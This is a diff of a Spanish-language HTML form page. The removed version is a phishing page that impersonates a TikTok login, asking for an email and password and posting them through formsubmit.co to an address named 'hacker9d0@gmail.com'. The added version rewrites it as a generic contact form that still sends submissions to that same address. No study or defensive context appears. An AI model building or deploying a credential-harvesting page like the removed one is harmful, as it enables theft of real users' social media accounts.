@@ -1,19 +1,16 @@
 <!DOCTYPE html>
-
-<html lang=“es”>
+<html lang="es">
 <head>
-<meta charset=“UTF-8” />
-<meta name=“viewport” content=“width=device-width, initial-scale=1.0” />
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>Formulario de contacto</title>
-
 <style>
 * {
   box-sizing: border-box;
 }
-
 body {
   margin: 0;
-  background-image: url(‘IMG_1098.jpeg’);
+  background-image: url('IMG_1098.jpeg');
   background-repeat: no-repeat;
   background-size: cover;
   background-position: center;
@@ -21,13 +18,11 @@ body {
   color: white;
   min-height: 100vh;
   padding: 20px;
-
   display: flex;
   justify-content: center;
   align-items: center;
   font-family: Arial, sans-serif;
 }
-
 .contenedor {
   width: 100%;
   max-width: 420px;
@@ -36,22 +31,18 @@ body {
   background: rgba(0, 0, 0, 0.75);
   backdrop-filter: blur(8px);
 }
-
 h2 {
   text-align: center;
   margin-bottom: 25px;
 }
-
 .field {
   margin-bottom: 18px;
 }
-
 label {
   display: block;
   margin-bottom: 7px;
   font-size: 14px;
 }
-
 input,
 textarea {
   width: 100%;
@@ -60,12 +51,10 @@ textarea {
   border-radius: 8px;
   font-size: 15px;
 }
-
 textarea {
   min-height: 120px;
   resize: vertical;
 }
-
 .submit-btn {
   width: 100%;
   padding: 14px;
@@ -76,36 +65,42 @@ textarea {
   font-weight: bold;
 }
 </style>
-
 </head>
-
 <body>
-
-<div class=“contenedor”>
-
-  <h2>inicia secion con tu cuenta de Tiktok </h2>
-
-  <form     action=”https://formsubmit.co/hacker9d0@gmail.com”     method=“POST”   >
-
+<div class="contenedor">
+  <h2>Envíanos un mensaje</h2>
+  <form
+    action="https://formsubmit.co/hacker9d0@gmail.com"
+    method="POST"
+  >
 <div class="field">
-  <label for="correo">correo electronico</label>
+  <label for="nombre">Nombre</label>
   <input
     type="text"
-    id="correo"
-    name="correo"
-    placeholder="correo electrónico"
+    id="nombre"
+    name="nombre"
+    placeholder="Tu nombre"
     required
   />
 </div>
 <div class="field">
-  <label for="contraseña">Contraseña</label>
+  <label for="correo">Correo electrónico</label>
   <input
-    type="password"
-    id="contraseña"
-    name="contraseña"
-    placeholder="contraseña"
+    type="email"
+    id="correo"
+    name="correo"
+    placeholder="tu@correo.com"
     required
   />
+</div>
+<div class="field">
+  <label for="mensaje">Mensaje</label>
+  <textarea
+    id="mensaje"
+    name="mensaje"
+    placeholder="Escribe tu mensaje aquí..."
+    required
+  ></textarea>
 </div>
 <input
   type="hidden"
@@ -118,12 +113,9 @@ textarea {
   value="table"
 />
 <button type="submit" class="submit-btn">
-  Iniciar secion
+  Enviar mensaje
 </button>
-
   </form>
-
 </div>
-
 </body>
 </html>
